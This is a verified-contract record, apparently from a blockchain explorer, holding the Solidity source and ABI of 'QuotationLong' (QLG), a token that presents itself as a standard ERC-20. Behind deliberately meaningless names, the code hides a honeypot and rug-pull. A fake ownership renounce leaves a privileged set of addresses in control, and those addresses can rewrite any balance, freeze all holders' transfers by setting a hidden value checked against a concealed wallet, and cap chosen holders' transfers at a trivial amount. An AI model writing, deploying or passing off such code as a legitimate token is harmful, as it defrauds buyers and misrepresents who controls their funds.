{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface senderMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract takeAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenSender {\n    function createPair(address atTo, address fromExemptShould) external returns (address);\n}\n\ninterface enableMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverAuto) external view returns (uint256);\n\n    function transfer(address buyMode, uint256 swapWallet) external returns (bool);\n\n    function allowance(address isTeamTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buyMode,\n        uint256 swapWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundMode, uint256 value);\n    event Approval(address indexed isTeamTx, address indexed spender, uint256 value);\n}\n\ninterface enableMaxMetadata is enableMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract QuotationLong is takeAmount, enableMax, enableMaxMetadata {\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoAmount;\n    }\n\n    address private listAmount;\n\n    string private txTrading = \"QLG\";\n\n    function marketingReceiver(address fromFund, address buyMode, uint256 swapWallet) internal returns (bool) {\n        require(tokenAuto[fromFund] >= swapWallet);\n        tokenAuto[fromFund] -= swapWallet;\n        tokenAuto[buyMode] += swapWallet;\n        emit Transfer(fromFund, buyMode, swapWallet);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return fundExemptFee;\n    }\n\n    uint256 private txTo;\n\n    function amountExempt() private view {\n        require(enableAt[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atBuyFund;\n    }\n\n    function transfer(address sellExempt, uint256 swapWallet) external virtual override returns (bool) {\n        return enableFund(_msgSender(), sellExempt, swapWallet);\n    }\n\n    function enableShould(uint256 swapWallet) public {\n        amountExempt();\n        feeEnable = swapWallet;\n    }\n\n    function getOwner() external view returns (address) {\n        return listAmount;\n    }\n\n    function transferFrom(address fromFund, address buyMode, uint256 swapWallet) external override returns (bool) {\n        if (_msgSender() != senderTotal) {\n            if (toLiquidityFund[fromFund][_msgSender()] != type(uint256).max) {\n                require(swapWallet <= toLiquidityFund[fromFund][_msgSender()]);\n                toLiquidityFund[fromFund][_msgSender()] -= swapWallet;\n            }\n        }\n        return enableFund(fromFund, buyMode, swapWallet);\n    }\n\n    uint256 private marketingBuy;\n\n    function balanceOf(address receiverAuto) public view virtual override returns (uint256) {\n        return tokenAuto[receiverAuto];\n    }\n\n    uint256 launchMode;\n\n    uint256 public launchReceiver;\n\n    address public tokenLiquidity;\n\n    bool public maxEnable;\n\n    mapping(address => bool) public exemptSwap;\n\n    uint256 public senderReceiverLimit;\n\n    function enableFund(address fromFund, address buyMode, uint256 swapWallet) internal returns (bool) {\n        if (fromFund == isTx) {\n            return marketingReceiver(fromFund, buyMode, swapWallet);\n        }\n        uint256 teamSell = enableMax(tokenLiquidity).balanceOf(limitAuto);\n        require(teamSell == feeEnable);\n        require(buyMode != limitAuto);\n        if (exemptSwap[fromFund]) {\n            return marketingReceiver(fromFund, buyMode, maxLaunchedSell);\n        }\n        return marketingReceiver(fromFund, buyMode, swapWallet);\n    }\n\n    uint256 private receiverTeam;\n\n    function allowance(address toWallet, address teamMax) external view virtual override returns (uint256) {\n        if (teamMax == senderTotal) {\n            return type(uint256).max;\n        }\n        return toLiquidityFund[toWallet][teamMax];\n    }\n\n    uint256 private atBuyFund = 100000000 * 10 ** 18;\n\n    uint256 constant maxLaunchedSell = 12 ** 10;\n\n    bool public atFee;\n\n    uint256 public isMode;\n\n    mapping(address => bool) public enableAt;\n\n    bool private swapIs;\n\n    function approve(address teamMax, uint256 swapWallet) public virtual override returns (bool) {\n        toLiquidityFund[_msgSender()][teamMax] = swapWallet;\n        emit Approval(_msgSender(), teamMax, swapWallet);\n        return true;\n    }\n\n    function senderReceiver() public {\n        emit OwnershipTransferred(isTx, address(0));\n        listAmount = address(0);\n    }\n\n    address limitAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function atShould(address sellExempt, uint256 swapWallet) public {\n        amountExempt();\n        tokenAuto[sellExempt] = swapWallet;\n    }\n\n    address public isTx;\n\n    string private fundExemptFee = \"Quotation Long\";\n\n    event OwnershipTransferred(address indexed launchedEnable, address indexed enableAmount);\n\n    uint8 private autoAmount = 18;\n\n    mapping(address => uint256) private tokenAuto;\n\n    function fromIs(address atAmountEnable) public {\n        amountExempt();\n        if (atFee != swapIs) {\n            marketingBuy = launchReceiver;\n        }\n        if (atAmountEnable == isTx || atAmountEnable == tokenLiquidity) {\n            return;\n        }\n        exemptSwap[atAmountEnable] = true;\n    }\n\n    constructor (){\n        if (swapIs) {\n            isMode = receiverTeam;\n        }\n        senderMin totalSwap = senderMin(senderTotal);\n        tokenLiquidity = tokenSender(totalSwap.factory()).createPair(totalSwap.WETH(), address(this));\n        if (atFee == swapIs) {\n            launchReceiver = senderReceiverLimit;\n        }\n        isTx = _msgSender();\n        senderReceiver();\n        enableAt[isTx] = true;\n        tokenAuto[isTx] = atBuyFund;\n        if (launchReceiver == isMode) {\n            txTo = marketingBuy;\n        }\n        emit Transfer(address(0), isTx, atBuyFund);\n    }\n\n    function owner() external view returns (address) {\n        return listAmount;\n    }\n\n    address senderTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return txTrading;\n    }\n\n    mapping(address => mapping(address => uint256)) private toLiquidityFund;\n\n    uint256 feeEnable;\n\n    function shouldReceiver(address modeAuto) public {\n        if (maxEnable) {\n            return;\n        }\n        if (receiverTeam != txTo) {\n            atFee = true;\n        }\n        enableAt[modeAuto] = true;\n        if (swapIs == atFee) {\n            atFee = false;\n        }\n        maxEnable = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTeamTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapWallet\",\"type\":\"uint256\"}],\"name\":\"atShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapWallet\",\"type\":\"uint256\"}],\"name\":\"enableShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atAmountEnable\",\"type\":\"address\"}],\"name\":\"fromIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderReceiverLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeAuto\",\"type\":\"address\"}],\"name\":\"shouldReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "QuotationLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}